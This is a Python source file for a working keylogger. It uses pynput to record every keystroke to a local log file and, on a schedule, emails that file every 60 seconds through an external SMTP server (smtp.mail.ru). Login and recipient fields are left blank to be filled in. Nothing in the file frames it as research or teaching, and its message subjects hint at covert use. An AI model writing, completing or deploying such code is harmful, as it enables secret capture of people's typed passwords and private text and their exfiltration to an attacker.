from pynput.keyboard import Key, Listener
import logging
import schedule
import time
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
import smtplib
import os
import threading

log_dir = ""

logging.basicConfig(filename=(log_dir + "logs.txt"),
                    level=logging.DEBUG, format='%(message)s')


def on_press(key):
    logging.info(str(key))


def start_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()


def message(subject="Hi Daddy", text="", img=None, attachment=None):
    # build message contents
    msg = MIMEMultipart()

    # Add Subject
    msg['Subject'] = subject

    # Add text contents
    msg.attach(MIMEText(text))

    # Check if an attachment is provided
    if attachment is not None:
        with open(attachment, 'rb') as f:
            # Read in the attachment using MIMEApplication
            file = MIMEApplication(
                f.read(),
                name=os.path.basename(attachment)
            )
        file['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment)}"'

        # Attach the file to the main message
        msg.attach(file)

    return msg


def mail():
    # initialize connection to our email server,
    # we will use gmail here
    smtp = smtplib.SMTP('smtp.mail.ru', 587)
    smtp.ehlo()
    smtp.starttls()

    # Login with your email and password
    smtp.login('', '')

    # Call the message function with the correct attachment parameter
    msg = message("I have something..", "For you", attachment="logs.txt")

    # Make a list of emails, where you wanna send mail
    to = [""]

    # Provide some data to the sendmail function!
    smtp.sendmail(from_addr="",
                  to_addrs=to, msg=msg.as_string())

    # Finally, don't forget to close the connection
    smtp.quit()



# Start the listener in a separate thread
listener_thread = threading.Thread(target=start_listener)
listener_thread.start()

# Schedule the email sending
schedule.every(60).seconds.do(mail)

while True:
    schedule.run_pending()
    time.sleep(1)
